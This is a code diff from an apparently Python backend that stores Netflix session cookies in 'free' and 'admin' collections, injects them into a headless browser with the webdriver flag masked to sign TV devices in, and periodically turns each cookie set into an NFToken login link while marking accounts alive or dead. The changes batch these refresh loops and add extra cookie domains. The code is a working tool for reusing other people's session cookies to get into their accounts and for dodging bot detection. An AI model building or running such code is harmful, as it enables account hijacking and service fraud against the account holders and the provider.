@@ -1907,11 +2217,21 @@ async def activate_tv_code(cookies: dict, code: str):
                 viewport={'width': 1920, 'height': 1080},
                 locale='en-US'
             )
-            cookie_list = [{
-                "name": name, "value": value,
-                "domain": ".netflix.com", "path": "/",
-                "secure": True, "sameSite": "None"
-            } for name, value in cookies.items()]
+            # Add cookies with flexible domain handling for different account types
+            cookie_list = []
+            for name, value in cookies.items():
+                cookie_list.append({
+                    "name": name, "value": value,
+                    "domain": ".netflix.com", "path": "/",
+                    "secure": True, "sameSite": "None"
+                })
+                # Also try main domain for critical auth cookies (especially for standard plans)
+                if name.lower() in ['nftoken', 'securenetflixid', 'netflixid', 'netflix_session']:
+                    cookie_list.append({
+                        "name": name, "value": value,
+                        "domain": "netflix.com", "path": "/",
+                        "secure": True, "sameSite": "None"
+                    })
             await context.add_cookies(cookie_list)
             page = await context.new_page()
             await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
@@ -1979,7 +2299,7 @@ async def activate_tv_code(cookies: dict, code: str):
             elif '/browse' in final_url or '/profiles' in final_url:
                 return True, "TV device activated! Code accepted."
             else:
-                return True, "Code submitted. Check your TV â€” it should be signed in now."
+                return True, "Code submitted. Check your TV - it should be signed in now."
     except Exception as e:
         logger.error(f"TV code activation error: {e}")
         return False, f"Activation failed: {str(e)}"
@@ -2023,13 +2343,71 @@ async def refresh_free_cookie_tokens():
                 first_run = False
             else:
                 await asyncio.sleep(NFTOKEN_REFRESH_INTERVAL)
-            free_cookies = await db.free_cookies.find({}, {"_id": 0}).to_list(500)
-            if not free_cookies:
+            total_count = await db.free_cookies.count_documents({})
+            if total_count == 0:
                 continue
-            logger.info(f"NFToken refresh: processing {len(free_cookies)} free cookies")
+            logger.info(f"NFToken refresh: processing {total_count} free cookies in batches")
             refreshed = 0
             dead = 0
-            for fc in free_cookies:
+            skipped = 0
+            processed = 0
+            BATCH_SIZE = 50
+            cursor = db.free_cookies.find({}, {"_id": 0}).batch_size(BATCH_SIZE)
+            batch = []
+            async for fc in cursor:
+                batch.append(fc)
+                if len(batch) < BATCH_SIZE:
+                    continue
+                for fc in batch:
+                    try:
+                        cookies_dict = None
+                        if fc.get("browser_cookies"):
+                            cookies_dict = parse_cookie_string_to_dict(fc["browser_cookies"])
+                        if (not cookies_dict or not cookies_dict.get("NetflixId")) and fc.get("full_cookie"):
+                            cookies_dict = parse_cookies_auto(fc["full_cookie"])
+                        if not cookies_dict:
+                            await db.free_cookies.update_one(
+                                {"id": fc["id"]},
+                                {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            )
+                            skipped += 1
+                            continue
+                        success, nft, nft_err = await generate_nftoken(cookies_dict)
+                        if success and nft:
+                            await db.free_cookies.update_one(
+                                {"id": fc["id"]},
+                                {"$set": {
+                                    "nftoken": nft,
+                                    "nftoken_link": f"https://netflix.com/?nftoken={nft}",
+                                    "is_alive": True,
+                                    "last_refreshed": datetime.now(timezone.utc).isoformat()
+                                }}
+                            )
+                            refreshed += 1
+                        else:
+                            if nft_err == "Netflix denied NFToken refresh for this account right now":
+                                await db.free_cookies.update_one(
+                                    {"id": fc["id"]},
+                                    {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                                )
+                                logger.info(f"NFToken refresh blocked by Netflix for {fc['id']}: {nft_err}")
+                                skipped += 1
+                                continue
+                            await db.free_cookies.update_one(
+                                {"id": fc["id"]},
+                                {"$set": {
+                                    "is_alive": False,
+                                    "last_refreshed": datetime.now(timezone.utc).isoformat()
+                                }}
+                            )
+                            dead += 1
+                    except Exception as e:
+                        logger.warning(f"NFToken refresh error for {fc['id']}: {e}")
+                processed += len(batch)
+                batch = []
+                await asyncio.sleep(1)
+            # Process remaining cookies in last partial batch
+            for fc in batch:
                 try:
                     cookies_dict = None
                     if fc.get("browser_cookies"):
@@ -2039,9 +2417,9 @@ async def refresh_free_cookie_tokens():
                     if not cookies_dict:
                         await db.free_cookies.update_one(
                             {"id": fc["id"]},
-                            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
                         )
-                        dead += 1
+                        skipped += 1
                         continue
                     success, nft, nft_err = await generate_nftoken(cookies_dict)
                     if success and nft:
@@ -2056,15 +2434,24 @@ async def refresh_free_cookie_tokens():
                         )
                         refreshed += 1
                     else:
+                        if nft_err == "Netflix denied NFToken refresh for this account right now":
+                            await db.free_cookies.update_one(
+                                {"id": fc["id"]},
+                                {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            )
+                            skipped += 1
+                            continue
                         await db.free_cookies.update_one(
                             {"id": fc["id"]},
-                            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            {"$set": {
+                                "is_alive": False,
+                                "last_refreshed": datetime.now(timezone.utc).isoformat()
+                            }}
                         )
                         dead += 1
-                        logger.warning(f"NFToken refresh failed for {fc['id']}: {nft_err}")
                 except Exception as e:
                     logger.warning(f"NFToken refresh error for {fc['id']}: {e}")
-            logger.info(f"NFToken refresh complete: {refreshed} alive, {dead} dead out of {len(free_cookies)}")
+            logger.info(f"NFToken refresh complete: {refreshed} alive, {dead} dead, {skipped} skipped out of {total_count}")
         except asyncio.CancelledError:
             logger.info("Free NFToken refresh task cancelled")
             break
@@ -2083,15 +2470,69 @@ async def refresh_admin_cookie_tokens():
             else:
                 await asyncio.sleep(ADMIN_NFTOKEN_REFRESH_INTERVAL)
 
-            admin_cookies = await db.admin_cookies.find({}, {"_id": 0}).to_list(500)
-            if not admin_cookies:
+            admin_total = await db.admin_cookies.count_documents({})
+            if admin_total == 0:
                 continue
 
-            logger.info(f"Admin NFToken refresh: processing {len(admin_cookies)} admin cookies")
+            logger.info(f"Admin NFToken refresh: processing {admin_total} admin cookies in batches")
             refreshed = 0
             dead = 0
-
-            for ac in admin_cookies:
+            skipped = 0
+            BATCH_SIZE = 50
+            cursor = db.admin_cookies.find({}, {"_id": 0}).batch_size(BATCH_SIZE)
+            batch = []
+            async for ac in cursor:
+                batch.append(ac)
+                if len(batch) < BATCH_SIZE:
+                    continue
+                for ac in batch:
+                    try:
+                        cookies_dict = None
+                        if ac.get("browser_cookies"):
+                            cookies_dict = parse_cookie_string_to_dict(ac["browser_cookies"])
+                        if (not cookies_dict or not cookies_dict.get("NetflixId")) and ac.get("full_cookie"):
+                            cookies_dict = parse_cookies_auto(ac["full_cookie"])
+                        if not cookies_dict:
+                            await db.admin_cookies.update_one(
+                                {"id": ac["id"]},
+                                {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            )
+                            skipped += 1
+                            continue
+                        success, nft, nft_err = await generate_nftoken(cookies_dict)
+                        if success and nft:
+                            await db.admin_cookies.update_one(
+                                {"id": ac["id"]},
+                                {"$set": {
+                                    "nftoken": nft,
+                                    "nftoken_link": f"https://netflix.com/?nftoken={nft}",
+                                    "is_alive": True,
+                                    "last_refreshed": datetime.now(timezone.utc).isoformat()
+                                }}
+                            )
+                            refreshed += 1
+                        else:
+                            if nft_err == "Netflix denied NFToken refresh for this account right now":
+                                await db.admin_cookies.update_one(
+                                    {"id": ac["id"]},
+                                    {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                                )
+                                skipped += 1
+                                continue
+                            await db.admin_cookies.update_one(
+                                {"id": ac["id"]},
+                                {"$set": {
+                                    "is_alive": False,
+                                    "last_refreshed": datetime.now(timezone.utc).isoformat()
+                                }}
+                            )
+                            dead += 1
+                    except Exception as e:
+                        logger.warning(f"Admin NFToken refresh error for {ac['id']}: {e}")
+                batch = []
+                await asyncio.sleep(1)
+            # Process remaining cookies in last partial batch
+            for ac in batch:
                 try:
                     cookies_dict = None
                     if ac.get("browser_cookies"):
@@ -2101,11 +2542,10 @@ async def refresh_admin_cookie_tokens():
                     if not cookies_dict:
                         await db.admin_cookies.update_one(
                             {"id": ac["id"]},
-                            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
                         )
-                        dead += 1
+                        skipped += 1
                         continue
-
                     success, nft, nft_err = await generate_nftoken(cookies_dict)
                     if success and nft:
                         await db.admin_cookies.update_one(
@@ -2119,16 +2559,25 @@ async def refresh_admin_cookie_tokens():
                         )
                         refreshed += 1
                     else:
+                        if nft_err == "Netflix denied NFToken refresh for this account right now":
+                            await db.admin_cookies.update_one(
+                                {"id": ac["id"]},
+                                {"$set": {"last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            )
+                            skipped += 1
+                            continue
                         await db.admin_cookies.update_one(
                             {"id": ac["id"]},
-                            {"$set": {"is_alive": False, "last_refreshed": datetime.now(timezone.utc).isoformat()}}
+                            {"$set": {
+                                "is_alive": False,
+                                "last_refreshed": datetime.now(timezone.utc).isoformat()
+                            }}
                         )
                         dead += 1
-                        logger.warning(f"Admin NFToken refresh failed for {ac['id']}: {nft_err}")
                 except Exception as e:
                     logger.warning(f"Admin NFToken refresh error for {ac['id']}: {e}")
 
-            logger.info(f"Admin NFToken refresh complete: {refreshed} alive, {dead} dead out of {len(admin_cookies)}")
+            logger.info(f"Admin NFToken refresh complete: {refreshed} alive, {dead} dead, {skipped} skipped out of {admin_total}")
         except asyncio.CancelledError:
             logger.info("Admin NFToken refresh task cancelled")
             break
@@ -2191,3 +2640,7 @@ async def shutdown_db_client():
             except asyncio.CancelledError:
                 pass
     client.close()
+
+
+
+
